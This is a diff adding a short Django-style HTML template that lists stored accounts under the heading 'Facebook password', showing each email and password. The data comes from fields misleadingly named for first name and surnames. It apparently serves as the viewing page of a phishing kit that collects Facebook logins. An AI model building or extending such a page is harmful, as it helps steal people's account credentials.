@@ -1,0 +1,13 @@
+	{% extends 'base.html' %}
+        {% block content %}
+        
+       {% for perfils in cuentas %}
+<ul class="list-group">
+  <li class="list-group-item active" aria-current="true">Contraseña de facebook</li>
+  <li class="list-group-item">CORREO: {{perfils.nombre}}</li>
+  <li class="list-group-item">CONTRASEÑA: {{perfils.apellidos}}</li>
+</ul>
+
+{% endfor %}
+       
+       {% endblock %}
